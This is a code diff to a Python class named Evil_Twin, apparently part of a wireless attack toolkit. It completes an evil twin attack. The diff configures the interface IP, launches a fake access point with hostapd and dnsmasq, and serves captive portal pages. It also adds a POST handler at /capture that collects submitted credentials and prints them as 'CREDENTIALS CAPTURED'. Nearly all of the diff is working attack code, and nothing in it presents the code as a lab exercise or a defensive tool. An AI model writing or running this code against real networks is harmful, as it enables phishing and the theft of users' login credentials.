@@ -2265,7 +2265,6 @@ class Evil_Twin():
     """This module will allow a user to perform a (passive) Evil Twin attack"""
 
 
-
     @classmethod
     def _choose_portal(cls) -> str:
         """Dictionary of Evil_Twin portals to choose from"""
@@ -2312,6 +2311,17 @@ class Evil_Twin():
 
         return portal_init, Path(BASE_DIR / "portals")
     
+
+    @classmethod
+    def _configure_ip(cls, iface):
+        """This will configure IP for evil twin"""
+
+        subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface], check=False)
+        subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", iface])
+        subprocess.run(["sudo", "ip", "link", "set", iface, "up"])
+        console.print(f"[bold green][+] Configured {iface} with IP 10.0.0.1")
+
+
 
     @classmethod
     def _make_hostapd_conf(cls, path, iface, ssid, channel=6, auth_algs=1, verbose=True):
@@ -2410,22 +2420,34 @@ class Evil_Twin():
     
     class _Evil_Server(SimpleHTTPRequestHandler):
         """Sub class of Evil_Twin for HTTP Requesting handling"""
-            
+
         def do_GET(self):
             """This will handle http requests that are made"""
 
+            if self.path == "/":
+                self.path = "/index.html"
 
-            if self.path == "/portal":
+            super().do_GET()
+
+        def do_POST(self):
+            """Handle credential capture from portals"""
+
+            if self.path == "/capture":
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+
+                try:
+                    data = json.loads(post_data.decode('utf-8'))
+                    console.print(f"[bold red][!] CREDENTIALS CAPTURED:[bold yellow] {data}")
+                except: pass
 
                 self.send_response(200)
                 self.send_header("Content-type", "application/json")
-                self.send_header("Access-Control-Allow-Origin", "*")
                 self.end_headers()
-
-                #self.wfile.write(json.dumps())
-
-            
-            else: super().do_GET()
+                self.wfile.write(b'{"status":"ok"}')
+            else:
+                self.send_response(404)
+                self.end_headers()
         
         
         @staticmethod
@@ -2445,23 +2467,38 @@ class Evil_Twin():
     def main(cls):
         """This will control class wide logic"""
 
+        
+        try:
+            iface = Frame_Snatcher.get_interface()
+            Frame_Snatcher.welcome_ui(iface=iface, text=" Evil \nTwin")
 
-        iface = Frame_Snatcher.get_interface()
-        Frame_Snatcher.welcome_ui(iface=iface, text=" Evil \nTwin")
+            portal, ssid = Evil_Twin._choose_portal()
+            conf_path, path = Evil_Twin._get_portal_path(portal=portal)
 
-        portal, ssid = Evil_Twin._choose_portal()
-        conf_path, path = Evil_Twin._get_portal_path(portal=portal)
-
-
-        h = Evil_Twin._make_hostapd_conf(path=conf_path, iface=iface, ssid=ssid)
-        d = Evil_Twin._make_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2)
-        Evil_Twin._launch_hostapd(path=h)
-        Evil_Twin._launch_dnsmasq(path=d)
-
-        Evil_Twin._Evil_Server._Start_HTTP_Server(path=path); pass
+            Evil_Twin._configure_ip(iface=iface)
 
 
+            h = Evil_Twin._make_hostapd_conf(path=conf_path, iface=iface, ssid=ssid)
+            d = Evil_Twin._make_dnsmasq_conf(path=conf_path, iface=iface); time.sleep(2)
+            Evil_Twin._launch_hostapd(path=h)
+            Evil_Twin._launch_dnsmasq(path=d)
 
+            Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
+        
+        except KeyboardInterrupt: console.print(f"[bold red]Leaving...")
+        
+        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+
+        """
+        1. Get interface
+        2. Choose portal & SSID
+        3. Configure interface IP (10.0.0.1) ✓
+        4. Create hostapd.conf
+        5. Create dnsmasq.conf
+        6. Launch hostapd (fake AP)
+        7. Launch dnsmasq (DHCP server)
+        8. Start HTTP server (captive portal)
+        """
 
 
 
